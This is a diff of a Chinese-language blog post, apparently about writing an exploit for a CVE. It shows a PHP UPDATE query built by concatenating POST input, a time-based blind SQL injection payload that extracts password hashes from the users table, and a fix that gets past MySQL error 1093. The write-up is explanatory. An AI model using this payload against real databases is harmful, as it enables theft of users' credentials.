@@ -202,7 +202,10 @@ var _hmt = _hmt || [];
       <div>
       </div>
     </div>
-    <html><head></head><body><p>前几天我把一个CVE写成EXP的时候遇到了一个问题<br>目标使用了直接拼接SQL语句的方法进行sql查询<br>而且使用的是UPDATE方法<br><code>sql_query("UPDATE users SET status = 'confirmed', editsecret = '' WHERE id IN (" . implode(", ", $_POST[conusr]) . ") AND status='pending'");</code><br>根据拼接的语句 我写出了这样的playload 准备读取数据库中用户表的密码hash<br><code>conusr[]=1) and if(ascii(mid((select group_concat(passhash) from users),%s,1))=%s,sleep(1),0)#</code><br>发现执行后报出错误<br><code>1093 - You can't specify target table 'users' for update in FROM clause</code><br>这里发生了一个非常巧的事情 刚好UPDATE操作的和要select操作的是同一张表<br>MYSQL不允许更新一张表的条件来自于查询这张表<br>解决方法:<br>在外面再套一层select<br><code>UPDATE users SET status = 'confirmed', editsecret = '' WHERE id IN (1) and if(ascii(mid((select * from (select group_concat(passhash) from users)as a),1,1))=1,sleep(1),0)#</code></p>
+    <html><head></head><body><p>前几天我把一个CVE写成EXP的时候遇到了一个问题<br>目标使用了直接拼接SQL语句的方法进行sql查询<br>而且使用的是UPDATE方法<br><code>sql_query("UPDATE users SET status = 'confirmed', editsecret = '' WHERE id IN (" . implode(", ", $_POST[conusr]) . ") AND status='pending'");</code><br>根据拼接的语句 我写出了这样的playload 准备读取数据库中用户表的密码hash</p>
+<span id="more"></span>
+
+<p><code>conusr[]=1) and if(ascii(mid((select group_concat(passhash) from users),%s,1))=%s,sleep(1),0)#</code><br>发现执行后报出错误<br><code>1093 - You can't specify target table 'users' for update in FROM clause</code><br>这里发生了一个非常巧的事情 刚好UPDATE操作的和要select操作的是同一张表<br>MYSQL不允许更新一张表的条件来自于查询这张表<br>解决方法:<br>在外面再套一层select<br><code>UPDATE users SET status = 'confirmed', editsecret = '' WHERE id IN (1) and if(ascii(mid((select * from (select group_concat(passhash) from users)as a),1,1))=1,sleep(1),0)#</code></p>
 </body></html>
 
   
